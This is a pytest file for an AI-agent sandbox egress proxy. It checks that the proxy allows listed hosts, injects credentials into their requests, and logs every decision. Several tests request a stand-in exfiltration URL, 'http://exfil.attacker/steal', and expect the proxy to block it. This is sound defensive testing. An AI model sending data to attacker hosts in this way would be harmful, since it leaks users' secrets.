"""Security-plane tests: the egress proxy actually allows, blocks, and injects.

These run with no Docker and no external network — a loopback origin stands in for
the "real" service, and the proxy routes to it via a host override. This is the
executable proof of the security story: allowlist enforced, credential injected at
egress, and every decision captured in the audit log.
"""

from __future__ import annotations

import asyncio
import json
import urllib.error
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Iterator

import pytest

from agent_workspaces.config import Settings
from agent_workspaces.models import Sandbox, SandboxState, WorkspaceRequest
from agent_workspaces.security.audit import EgressAuditLog, EgressDecision
from agent_workspaces.security.isolation import ProxyingSecurityPlane
from agent_workspaces.security.proxy_server import EgressProxy
from agent_workspaces.trace.recorder import InMemoryTraceRecorder
from agent_workspaces.trace.tracer import Tracer

_ORIGIN_TOKEN = "s3cr3t-eval-token"


class _OriginHandler(BaseHTTPRequestHandler):
    """A tiny 'real service' that requires the injected credential."""

    def do_GET(self) -> None:  # noqa: N802
        if self.headers.get("Authorization") == f"Bearer {_ORIGIN_TOKEN}":
            body = json.dumps({"ok": True, "experiments": [1, 2, 3]}).encode()
            code = 200
        else:
            body = json.dumps({"error": "unauthorized"}).encode()
            code = 401
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args: object) -> None:
        return None


@pytest.fixture
def origin() -> Iterator[tuple[str, int]]:
    server = ThreadingHTTPServer(("127.0.0.1", 0), _OriginHandler)
    host, port = server.server_address[0], server.server_address[1]
    import threading

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield host, port
    finally:
        server.shutdown()
        server.server_close()


@pytest.fixture
def proxy(origin: tuple[str, int]) -> Iterator[EgressProxy]:
    audit = EgressAuditLog()
    p = EgressProxy(host="127.0.0.1", port=0, audit=audit)
    # "api.internal" is an approved logical host mapped to the loopback origin.
    p.set_host_overrides({"api.internal": origin, "exfil.attacker": origin})
    p.set_allowlist(["api.internal"])
    p.set_credentials({"api.internal": _ORIGIN_TOKEN})
    p.set_active_sandbox("sbx_test")
    p.start()
    try:
        yield p
    finally:
        p.stop()


def _get(proxy_url: str, url: str) -> tuple[int, str]:
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy_url}))
    try:
        with opener.open(url, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:  # type: ignore[attr-defined]
        return exc.code, exc.read().decode()


def test_allowlisted_call_injects_credential(proxy: EgressProxy) -> None:
    status, body = _get(proxy.url, "http://api.internal/experiments")
    assert status == 200
    assert json.loads(body)["ok"] is True

    entries = proxy.audit.entries()
    allow = [e for e in entries if e["host"] == "api.internal" and e["allowed"]]
    assert allow, "expected an allow decision for api.internal"
    assert allow[-1]["credential_injected"] is True


def test_non_allowlisted_host_is_blocked(proxy: EgressProxy) -> None:
    status, _ = _get(proxy.url, "http://exfil.attacker/steal")
    assert status == 403

    blocked = [e for e in proxy.audit.entries() if e["host"] == "exfil.attacker"]
    assert blocked and blocked[-1]["allowed"] is False


def test_audit_log_records_every_decision(proxy: EgressProxy) -> None:
    _get(proxy.url, "http://api.internal/a")
    _get(proxy.url, "http://exfil.attacker/b")
    hosts = {e["host"] for e in proxy.audit.entries()}
    assert {"api.internal", "exfil.attacker"} <= hosts


async def test_security_plane_streams_egress_into_trace() -> None:
    settings = Settings(
        security_backend="proxy", egress_proxy_host="127.0.0.1", egress_proxy_port=0
    )
    plane = ProxyingSecurityPlane(settings)
    recorder = InMemoryTraceRecorder(settings)
    request = WorkspaceRequest(agent_id="a", task_prompt="t", extra_egress_hosts=["api.internal"])
    trace_id = await recorder.start(workspace_id="ws_x", request=request)
    tracer = Tracer(recorder, trace_id, "ws_x")
    sandbox = Sandbox(
        id="sbx_1",
        state=SandboxState.CLAIMED,
        base_image="python:3.11",
        created_at=datetime.now(timezone.utc),
    )
    try:
        await plane.secure(sandbox, request, tracer=tracer)
        # Simulate the proxy thread recording a decision; it should be streamed.
        plane.audit.record(
            EgressDecision(
                ts=datetime.now(timezone.utc).isoformat(),
                method="GET",
                host="api.internal",
                path="/x",
                allowed=True,
                reason="forwarded",
                credential_injected=True,
                sandbox_id="sbx_1",
            )
        )
        await asyncio.sleep(0.1)  # let the cross-thread emit land on the loop
        kinds = [e.kind for e in await recorder.load(trace_id)]
        assert "security.egress" in kinds

        await plane.teardown(sandbox, tracer=tracer)
        # After teardown the callback is cleared: new decisions don't stream.
        before = len(await recorder.load(trace_id))
        plane.audit.record(
            EgressDecision(
                ts=datetime.now(timezone.utc).isoformat(),
                method="GET",
                host="api.internal",
                path="/y",
                allowed=True,
                reason="forwarded",
            )
        )
        await asyncio.sleep(0.05)
        assert len(await recorder.load(trace_id)) == before
    finally:
        plane.shutdown()
